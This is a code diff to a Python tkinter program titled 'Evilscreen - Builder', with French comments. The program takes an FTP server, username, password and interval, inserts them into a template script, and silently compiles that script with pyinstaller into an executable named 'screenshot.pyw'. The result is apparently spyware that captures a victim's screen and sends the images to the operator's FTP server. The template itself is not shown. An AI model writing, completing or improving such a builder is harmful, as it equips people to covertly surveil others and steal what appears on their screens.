@@ -1,3 +1,4 @@
+from importlib.resources import path
 from tkinter import *
 from PIL import ImageTk, Image
 from dataclasses import replace
@@ -5,26 +6,30 @@ import os
 import sys
 import subprocess
 import time
+from pathlib import Path
 
 #créer la main fenêtre
 window = Tk()
 
 def filemodify():
-    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "\ok\pd.txt"
+    script_location = os.path.split(os.path.realpath(sys.argv[0]))[0] + "ok/file.txt"
+    print(script_location)
     f1 = open(script_location, 'r')
-    f2 = open('arabe.pyw', 'w')
+    f2 = open('screenshot.pyw', 'w')
     
     for line in f1:
         line = line.replace('nameeftp', ftpserveur)
         line = line.replace('usernameftp', ftpusername)
         line = line.replace('passwordftp', ftppassword)
-        line = line.replace('temps', time)
+        line = line.replace('temps', timee)
         f2.write(line)
     
     f1.close()
     f2.close()
     CREATE_NO_WINDOW = 0x08000000
-    subprocess.call(r"pyinstaller --onefile arabe.pyw", creationflags=CREATE_NO_WINDOW)
+    subprocess.call(r"pyinstaller --onefile screenshot.pyw", creationflags=CREATE_NO_WINDOW)
+    time.sleep(3)
+    
 
     
 
@@ -134,8 +139,8 @@ def push():
     window.mainloop()
 
 def finish():
-    global time
-    time = timeentry.get()
+    global timee
+    timee = timeentry.get()
     window.config(background='#310E35')
     window.title("Evilscreen - Builder")
     frame3.destroy()
@@ -146,7 +151,7 @@ def finish():
 
     frame4 = Frame(window, bg="#310E35")
 
-    timelabel = Label(frame4, text="Le build est en cours ! :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)
+    timelabel = Label(frame4, text="Le build est terminé ! :", font=("Courrier", 10), bg='#310E35', fg="white").grid(row=2, column=1, pady=10)
 
     filemodify()
 
